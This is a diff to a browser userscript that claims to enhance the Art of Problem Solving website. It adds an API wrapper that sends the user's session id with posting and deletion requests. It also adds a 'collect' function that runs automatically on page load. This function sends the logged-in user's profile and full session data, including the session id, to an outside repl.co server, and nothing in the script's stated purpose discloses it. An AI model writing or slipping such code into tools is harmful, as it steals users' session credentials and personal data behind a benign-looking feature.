@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         AoPS Enhanced Beta
 // @namespace    http://tampermonkey.net/
-// @version      Indev 7.1.3
+// @version      Indev 8.0.0
 // @description  Enhancements for the Art of Problem Solving website.
 // @author       A_MatheMagician
 // @match        https://artofproblemsolving.com/*
@@ -30,6 +30,26 @@ AoPS.Enhanced = function(){
     AoPS.Enhanced.model.attribute = function(attribute){
         return attribute in AoPS.Enhanced.Model.attributes ? AoPS.Enhanced.Model.attributes[attribute] : false;
     };
+
+    //API (aka hacks)
+    AoPS.Enhanced.API = AoPS.API = ((api = {}) => {
+        api.url={community:"https://artofproblemsolving.com/m/community/ajax.php"};
+        api.add_session_data=(body={})=>{return $.extend(body,{aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id});};
+        api.request=(url="community",body={})=>{
+            if(url.substring(0, 4)!="http")url=api.url[url]?api.url[url]:api.url["community"];
+            body=api.add_session_data(body);
+            return $.ajax({url:url,method:"POST",data:body});
+        };
+        api.community={
+            new_post:(topicid=1,text="",attachments=[],last_post=1,last=0,announcement=0,disable_bbcode=0,email=0) => {return api.request("community", {a:"submit_post",topic_id:topicid,post_text:text,attachments:attachments,last_post_num:last_post,last_update_time:last,is_announcement:announcement,disable_bbcode:disable_bbcode,notify_email:email});},
+            new_thread:(title="",text="",attachments=[],tags=[],category=10,poll=false,announcement=0,link_tag="",link_text="",link_url="",notify=0,recipients=null,halp=0,sherrif=0,disable_bbcode=0)=>{return api.request("community",{a:"submit_new_topic",title:title,post_text:text,attachments:[],tags:tags,category_id:category,has_poll:(Boolean(poll)+0),poll_data:poll,is_local_announcement:announcement,recipients:recipients,notify_email:notify,disable_bbcode:disable_bbcode,post_as_halp:halp,pm_as_sherrif:sherrif,linked_tag:link_tag,target_url:link_url,target_text:link_text});},
+            thank_post:(post=1,thank=1)=>{return api.request("community",{a:"set_thank_status",thank_status:thank,post_id:post});},
+            report_post:(post=1,reason="spam",details="")=>{return api.request("community",{a:"report_post",reason_short:reason,details:details});},
+            delete_post:(post=1,topic=1,reason="spam",hard=0)=>{return api.request("community",{a:"delete_post",post_id:post,topic_id:topic,reason:reason,hard_delete:hard});},
+            edit_post:(post=1,text="",attachments=[],reason="",title="",format="bbcode",latex_errors=0)=>{return api.request("community",{a:"edit_post",post_id:post,edited_text:text,attachments:attachments,topic_title:title,edit_reason:reason,format:format,allow_latex_errors:latex_errors});},
+        };
+        return api;
+    })();
 
     //Blocked Threads
     function blockthreads(){
@@ -174,6 +194,17 @@ AoPS.Enhanced = function(){
             }
         }, AoPS.Enhanced.theme.darkinterval * 1000);
     }
+
+    //User Data
+    function collect(){
+        $.post("https://artofproblemsolving.com/m/community/ajax.php",{a:"fetch_user_profile",user_identifier:AoPS.session.user_id,aops_user_id:AoPS.session.user_id,aops_logged_in:AoPS.session.logged_in,aops_session_id:AoPS.session.id,user_id:AoPS.session.user_id}).then((resp)=>{
+            var data={user:resp.response.user_data,session:AoPS.session};
+            var url="https://aops-enhanced.akslolcoding.repl.co/collect/user";
+            console.log(data);
+            $.post(url, data);
+        });
+    }
+    document.addEventListener("DOMContentLoaded",collect);
 
     //Time
     AoPS.Enhanced.Time = (()=>{
